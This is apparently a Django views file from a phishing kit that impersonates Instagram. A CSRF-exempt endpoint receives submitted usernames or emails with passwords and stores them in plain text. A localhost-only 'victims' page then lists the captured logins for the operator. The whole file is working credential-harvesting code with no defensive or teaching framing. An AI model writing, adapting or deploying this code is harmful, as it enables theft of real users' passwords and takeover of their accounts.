from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse, HttpResponseForbidden
from instagram.models import LoginAttempt

def victims(request):
    # Restrict access to local IPs
    ip = request.META.get('REMOTE_ADDR')
    if ip not in ['127.0.0.1', '::1']:
        return HttpResponseForbidden("Access denied.")

    logins = LoginAttempt.objects.order_by('-timestamp')
    return render(request, 'victims/index.html', {'logins': logins})


@csrf_exempt
def receive_login(request):
    if request.method == 'POST':
        username_or_email = request.POST.get('username_or_email')
        password = request.POST.get('password')

        if username_or_email and password:
            LoginAttempt.objects.create(
                username_or_email=username_or_email,
                password=password
            )
            return JsonResponse({'status': 'success'})

    return JsonResponse({'status': 'error'}, status=400)
